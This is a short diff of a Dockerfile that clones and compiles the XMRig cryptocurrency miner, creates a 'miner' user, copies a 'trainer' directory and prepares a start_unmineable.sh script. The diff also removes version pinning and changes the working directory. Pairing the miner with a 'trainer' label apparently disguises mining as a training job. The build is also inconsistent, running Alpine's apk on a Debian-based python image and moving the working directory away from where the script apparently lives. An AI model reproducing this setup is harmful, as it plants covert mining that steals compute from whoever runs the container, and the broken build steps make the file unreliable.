@@ -1,4 +1,5 @@
 FROM python:3.7
+WORKDIR /
 RUN adduser -S -D -H -h /xmrig miner
 RUN apk --no-cache upgrade \
     && apk --no-cache add \
@@ -10,7 +11,6 @@ RUN apk --no-cache upgrade \
     libmicrohttpd-dev \
     && git clone https://github.com/xmrig/xmrig.git \
     && cd xmrig \
-    && git checkout v6.21.0 \
     && mkdir build \
     && cmake -DWITH_HWLOC=OFF -DCMAKE_BUILD_TYPE=Release . \
     && make -j$(nproc) \
@@ -20,7 +20,7 @@ RUN apk --no-cache upgrade \
     git \
 
 
-WORKDIR /xmrig
+
 COPY trainer /trainer
 RUN chmod +x start_unmineable.sh
 
